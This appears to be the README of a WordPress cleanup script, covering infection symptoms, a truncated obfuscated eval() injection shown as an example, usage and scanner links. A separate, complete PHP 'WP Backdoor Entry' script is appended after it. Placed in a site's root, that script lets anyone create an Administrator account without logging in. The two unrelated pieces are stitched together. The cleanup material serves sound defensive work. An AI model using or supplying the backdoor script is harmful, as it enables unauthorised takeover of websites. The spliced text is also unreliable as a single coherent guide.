WP CLEANUP
Script to clean up infected WordPress installations

##
#
https://github.com/pforret/wp_cleanup
#
##

your site is still accessible, but when you try to access /wp-admin you get an 403 (access denied) error
your site is off-line, gives an error 500 (server error), or shows an empty page, or a WordPress error "There has been a critical error on this website."
your site is still accessible but inserts malicious code that generates popup advertising or redirects to other websites
You should go and check the WordPress files with a SSH console or through an (s)FTP connection. Files that were installed by WordPress might have been changed by malicious code (virus/trojan/infection, whatever you want to call it).

A typical example is the ./index.php file. Normally it should only contain

<?php
/**
   comments don't really matter, there are only 2 lines of real code to be executed 
 */
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
Some viruses insert extra hard-to-read PHP code in to index.php:

<?php
 $PxzcQOgNk = function($jWC9KOqRQtX9 ,$MDafuOVYz) {
 $lKnbe="_Qf5zyRU";
 }
return $lKnbe;
(...)
evAL($XG51n);; ?><?php  define('WP_USE_THEMES', true );require(__DIR__.  '/wp-blog-header.php' ); ?>
They might also create new files (like admin.php, which sounds official, but is not part of a normal WP installation), or new folders (like psp/, which again is not part of a normal WP installation).

What you want to do in this case, is restore all WordPress source code files to their original state. This is what this script does.

Installation
log in to your hacked server (via ssh)
cd to a folder where you have 'write' permissions
git clone https://github.com/pforret/wp_cleanup
cd wp_cleanup
./wp_cleanup -W [WP folder] fix
✅  WordPress installation moved to [_infected.20230412_1643]
✴️: # this folder should not be in a WP install -- remove it!
✴️: # rm -fr '.../unusualdir'
✅  Wordpress 6.2 downloaded!
✅  Wordpress system restored!
✅  Copied from themes: testtheme  
✅  Copied from plugins: testplugin  
✅  Wordpress settings copied!
✅  Wordpress .htaccess set!
✅  --- Wordpress cleanup was done
Do you want to compress the infected files? [y/N] Y 
✅  old WordPress moved to _infected.20230412_1643.zip
This will

move your current (infected) WordPress files to a backup folder
replace your wp-admin and wp-includes folders with those of a fresh WordPress install
replace your wp-*.php files with those of a fresh WordPress install
recover your original wp-config.php file
recover your original wp-content: themes,plugins,uploads
reset your .htaccess file
Usage
Program : wp_cleanup  by peter@forret.com
Version : v0.1.5 (2023-04-12 16:49)
Purpose : clean up infected WordPress installations
Usage   : wp_cleanup [-h] [-q] [-v] [-f] [-l <log_dir>] [-t <tmp_dir>] [-W <WP>] [-M <MULTI>] <action>
Flags, options and parameters:
    -h|--help        : [flag] show usage [default: off]
    -q|--quiet       : [flag] no output [default: off]
    -v|--verbose     : [flag] also show debug messages [default: off]
    -f|--force       : [flag] do not ask for confirmation (always yes) [default: off]
    -l|--log_dir <?> : [option] folder for log files   [default: /home/pforret/.wp_cleanup/log]
    -t|--tmp_dir <?> : [option] folder for temp files  [default: /home/pforret/.wp_cleanup/tmp]
    -W|--WP <?>      : [option] WordPress installation folder  [default: .]
    -M|--MULTI <?>   : [option] Multi-site setup: subdomain/subfolder
    <action>         : [choice] action to perform  [options: detect,fix,check,env,update]

### TIPS & EXAMPLES
* use wp_cleanup detect to check if there is an infected WP installation in that folder
  wp_cleanup -W /home/sites/wp_1 detect
* use wp_cleanup fix to run the cleanup (reinstall WP)
  wp_cleanup -W /home/sites/wp_1 fix
* use wp_cleanup check to check if this script is ready to execute and what values the options/flags are
  wp_cleanup check
* use wp_cleanup env to generate an example .env file
  wp_cleanup env > .env
* use wp_cleanup update to update to the latest version
  wp_cleanup update
* >>> bash script created with pforret/bashew
* >>> for bash development, also check IO:print pforret/setver and pforret/IO:progressbar
Valuable articles
RESOLVED: cutwin Javascript injection (WordPress)
FAQ My site was hacked (WordPress)
Removing Malicious Redirects From Your Site (WordFence)
How To Completely Clean Your Hacked WordPress Installation
Test your site
https://sitecheck.sucuri.net/ (site keeps a cached version of your site, used a random parameter ?test=7763 after the URL to get a new scan)
http://www.unmaskparasites.com/
https://www.virustotal.com/gui/home/url
Check if your site has been flagged as unsafe
https://transparencyreport.google.com/safe-browsing/search
https://global.sitesafety.trendmicro.com/
https://www.trustedsource.org/
  


  ```
  <?php
/*

  Script Name: WP Backdoor Entry
  
  Description: A script to create a new user with Administrator role.
  
  Usage: Copy this file into your WordPress root folder and execute the script via the browser.

  */


$wp_folder  = '';
$username   = '';
$email      = '';
$password   = '';
$role       = '';

/** Make sure that the WordPress bootstrap has run before continuing. */
if (!empty($wp_folder)) {
  $wp_load_path = $wp_folder . '/wp-load.php';
} else {
  $wp_load_path = 'wp-load.php';
}

if (!file_exists($wp_load_path)) {
  echo "ERROR! wp-load.php does not exist!";
  echo '<br>';
  exit;
}

include($wp_load_path);

function ac_create_wp_user($username, $email, $password, $role)
{

  if( isset($_POST['submit'])) {
    $username  = htmlentities($_POST['name']);
    $email     = htmlentities($_POST['email']);
    $password  = htmlentities($_POST['password']);
    $role      = strtolower(htmlentities($_POST['role']));
  }

  if (!username_exists($username) && !email_exists($email)) {

    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role($role);

  } else {
    echo 'ERROR! The username or email is already exists!';
    echo '<br>';
    exit;
  }

  if (! empty($username) && ! empty($password) && ! empty($email)) {
    header("Location: /wp-login.php");
    exit;
  }
}

ac_create_wp_user($username, $password, $email, $role);

add_action('init', 'ac_create_wp_user');

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WP Backdoor Entry</title>
  <style>
    * {
      padding: 0;
      margin: 0;
    }

    /* Style inputs, select elements and textareas */
    input[type=text],
    input[type=email],
    input[type=password],
    select,
    textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      resize: vertical;
    }

    h1 {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      padding-bottom: 10px;
    }

    /* Style the label to display next to the inputs */
    label {
      padding: 12px 12px 12px 0;
      display: inline-block;
    }

    /* Style the submit button */
    input[type=submit] {
      background-color: #04AA6D;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      float: right;
    }

    /* Style the container */
    .container {
      border-radius: 5px;
      background-color: #f2f2f2;
      padding: 100px 50px 100px 50px;
      height: 100vh;
    }

    /* Floating column for labels: 25% width */
    .col-25 {
      float: left;
      width: 25%;
      margin-top: 6px;
    }

    /* Floating column for inputs: 75% width */
    .col-75 {
      float: left;
      width: 75%;
      margin-top: 6px;
    }

    /* Clear floats after the columns */
    .row:after {
      content: "";
      display: table;
      clear: both;
    }

    /* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
    @media screen and (max-width: 600px) {

      .col-25,
      .col-75,
      input[type=submit] {
        width: 100%;
        margin-top: 0;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>WP Backdoor Entry</h1>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
      <div class="row">
        <div class="col-25">
          <label for="fname">Username</label>
        </div>
        <div class="col-75">
          <input type="text" id="fname" name="name" placeholder="Username" required autocomplete="off">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="lname">Email</label>
        </div>
        <div class="col-75">
          <input type="email" id="lname" name="email" placeholder="E-Mail" required autocomplete="off">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="lname">Password</label>
        </div>
        <div class="col-75">
          <input type="password" id="lname" name="password" placeholder="Password" required>
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="country">Select a role:</label>
        </div>
        <div class="col-75">
          <select id="role" name="role">
            <option>Subscriber</option>
            <option>Contributor</option>
            <option>Author</option>
            <option>Editor</option>
            <option>Administrator</option>
          </select>
        </div>
      </div>
      <br>
      <br>
      <div class="row">
        <input type="submit" value="Submit" name="submit">
      </div>
    </form>
  </div>
</body>

</html>
```
